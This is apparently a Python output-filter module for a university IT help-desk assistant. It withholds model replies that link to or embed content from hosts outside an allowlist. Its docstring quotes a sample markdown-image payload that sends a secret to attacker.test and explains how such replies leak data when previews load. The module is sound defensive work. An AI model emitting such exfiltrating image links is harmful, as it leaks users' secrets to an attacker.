"""
Layer 2d - Link allowlist: withhold replies that link outside a short list of trusted sites.

Why (two risks, one rule):
  1. Exfiltration: a reply such as ![](https://attacker.test/?d=SECRET) makes the user's browser send the
     secret to the attacker the moment an image or link preview loads, even if nobody clicks it.
  2. Made-up links: the model sometimes invents official-looking addresses (e.g. a fake password-reset
     page). Sending users to an unknown site is a phishing risk for a help desk.

Rule: every web address in the reply must be on the allowlist below. Hidden images and embedded
resources (markdown images, <img>, <iframe>, <script>...) pointing anywhere else are always withheld.
E-mail addresses are ignored. The reason never contains the URL (it may carry a secret).
"""

import re
import time
import unicodedata
from typing import Optional

from checks.check_interface import BaseCheck, CheckResult, SecurityContext

# Exact hosts (SU help pages listed in the system prompt). Any other salisbury.edu host is treated as made up.
ALLOWED_HOSTS = {
    "salisbury.edu", "www.salisbury.edu", "support.center.salisbury.edu", "myclasses.salisbury.edu",
    "su-support.atlassian.net",
}
# Trusted vendor domains: the domain itself and any sub-domain (support.microsoft.com, support.apple.com...).
ALLOWED_DOMAINS = {
    "microsoft.com", "office.com", "live.com", "outlook.com", "microsoft365.com", "apple.com", "google.com",
    "dell.com", "hp.com", "lenovo.com", "nvidia.com", "amd.com", "zoom.us", "mozilla.org",
    "example.com", "example.org", "example.net",  # reserved for documentation, never real sites
}
_TLDS = r"(?:com|net|org|edu|gov|mil|int|io|co|uk|us|ca|de|fr|ru|cn|info|biz|app|dev|test|me|ly|ai|cloud|xyz|site|online|top|tk|internal|local)"
# A web address: optional scheme, a host made of dot-separated labels ending in a known top-level domain.
_URL = re.compile(rf"(?i)(?<![@\w.-])(?:(?:https?|ftp)://|//)?((?:[a-z0-9-]+\.)+{_TLDS})(?![\w-])(?::\d+)?")
_RAW_IP = re.compile(r"(?i)\b(?:https?|ftp)://\d{1,3}(?:\.\d{1,3}){3}\b")
# Embedded resources that load without a click.
_EMBED = re.compile(r"(?is)!\[[^\]]*\]\(\s*<?([^)\s>]+)|<\s*(?:img|iframe|script|link|video|audio|source|embed|object)\b[^>]*?"
                    r"(?:src|href|data)\s*=\s*['\"]?([^'\"\s>]+)")


def _host_allowed(host: str) -> bool:
    host = host.lower().rstrip(".")
    return host in ALLOWED_HOSTS or any(host == d or host.endswith("." + d) for d in ALLOWED_DOMAINS)


def _host_of(url: str) -> Optional[str]:
    m = _URL.search(url)
    return m.group(1) if m else None


def link_problem(text: str) -> Optional[str]:
    """Return a short reason if the reply links outside the allowlist, else None."""
    if not text:
        return None
    text = unicodedata.normalize("NFKC", text).replace("​", "")
    for m in _EMBED.finditer(text):
        target = m.group(1) or m.group(2) or ""
        host = _host_of(target)
        if target.startswith(("http", "//")) or host:
            if not host or not _host_allowed(host):
                return "embedded image or resource from a site outside the allowlist"
    if _RAW_IP.search(text):
        return "link to a raw IP address"
    for m in _URL.finditer(text):
        if not _host_allowed(m.group(1)):
            return "link to a site outside the allowlist"
    return None


class LinkAllowlistCheck(BaseCheck):
    """Withholds replies that link or embed content from sites outside the allowlist."""

    def __init__(self):
        super().__init__(name="layer_2d_link_allowlist")

    def evaluate(self, model_output: str, context: SecurityContext) -> CheckResult:
        start = time.perf_counter()
        reason = link_problem(model_output or "")
        return CheckResult(
            is_violation=reason is not None,
            layer_name=self.name,
            confidence=0.9 if reason else 0.0,
            matched_fragment=None,  # the URL itself may carry a secret
            reason=f"Reply contains a {reason}" if reason else None,
            latency_ms=(time.perf_counter() - start) * 1000.0,
            metadata={"link_rule": reason} if reason else {},
        )
